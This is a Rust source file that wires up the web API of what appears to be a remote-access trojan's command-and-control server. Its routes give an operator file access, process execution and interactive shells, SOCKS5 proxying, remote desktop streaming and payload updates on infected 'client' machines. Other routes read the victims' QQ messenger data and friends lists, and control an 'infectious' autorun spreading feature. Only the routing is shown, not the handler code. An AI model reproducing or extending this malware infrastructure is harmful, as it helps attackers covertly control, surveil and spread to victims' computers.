mod client;
mod global;
mod server;
mod session;

use crate::{ServerMap, web::util};
use actix_cors::Cors;
use actix_identity::IdentityMiddleware;
use actix_session::{SessionMiddleware, storage::CookieSessionStore};
use actix_web::{
    App, HttpServer,
    cookie::Key,
    middleware::{self, NormalizePath},
    web::{self, Data},
};
use anyhow::Result;
use middleware::Logger;
use std::{net::SocketAddr, sync::Arc};
use tokio::sync::RwLock;

pub struct Config {
    addr: SocketAddr,
    tls_config: rustls::ServerConfig,
    use_https: bool,
}

impl From<&crate::Config> for Config {
    fn from(config: &crate::Config) -> Self {
        Self {
            addr: config.api_addr,
            tls_config: config.tls_config.clone(),
            use_https: config.use_https,
        }
    }
}

pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<()> {
    let server = HttpServer::new(move || {
        let (path_config, query_config, form_config, multipart_config, json_config) =
            util::extractor_config();

        App::new()
            .wrap(Logger::default())
            .wrap(NormalizePath::trim())
            .wrap(IdentityMiddleware::default())
            .wrap(SessionMiddleware::new(
                CookieSessionStore::default(),
                Key::from(env!("M0N1T0R_SECRET").replace('-', "").as_bytes()),
            ))
            // TODO: restrict origin
            .wrap(Cors::permissive())
            .app_data(Data::new(server_map.clone()))
            .app_data(path_config)
            .app_data(query_config)
            .app_data(form_config)
            .app_data(multipart_config)
            .app_data(json_config)
            .service(
                web::scope("/api").service(
                    web::scope("/v1")
                        .service(
                            web::scope("/client")
                                .service(client::all)
                                .service(client::get)
                                .service(client::delete)
                                .service(
                                    web::scope("/{addr}")
                                        .service(client::environment::get)
                                        .service(client::notification::get)
                                        .service(
                                            web::scope("/update")
                                                .service(client::update::by_url::post)
                                                .service(client::update::by_file::post),
                                        )
                                        .service(
                                            web::scope("/fs")
                                                .service(client::fs::metadata::get)
                                                .service(client::fs::get)
                                                .service(client::fs::delete)
                                                .service(client::fs::put),
                                        )
                                        .service(
                                            web::scope("/process")
                                                .service(client::process::interactive::get)
                                                .service(client::process::execute::post)
                                                .service(client::process::all)
                                                .service(client::process::delete),
                                        )
                                        .service(
                                            web::scope("/proxy")
                                                .service(client::proxy::socks5::noauth::post)
                                                .service(client::proxy::socks5::pass::post)
                                                .service(client::proxy::forward::post),
                                        )
                                        .service(
                                            web::scope("/network")
                                                .service(client::network::download::post),
                                        )
                                        .service(
                                            web::scope("/qq")
                                                .service(client::qq::get)
                                                .service(client::qq::url::get)
                                                .service(client::qq::friend::get),
                                        )
                                        .service(
                                            web::scope("/autorun")
                                                .service(client::autorun::infectious::get)
                                                .service(client::autorun::infectious::post),
                                        )
                                        .service(
                                            web::scope("/rd")
                                                .service(client::rd::all)
                                                .service(client::rd::stream::get),
                                        ),
                                ),
                        )
                        .service(
                            web::scope("/server")
                                .service(server::get)
                                .service(server::notification::get)
                                .service(server::proxy::get)
                                .service(server::proxy::delete),
                        )
                        .service(session::post)
                        .service(session::delete),
                ),
            )
    });
    match config.use_https {
        true => server.bind_rustls_0_23(config.addr, config.tls_config.clone()),
        false => server.bind(config.addr),
    }?
    .run()
    .await?;
    Ok(())
}
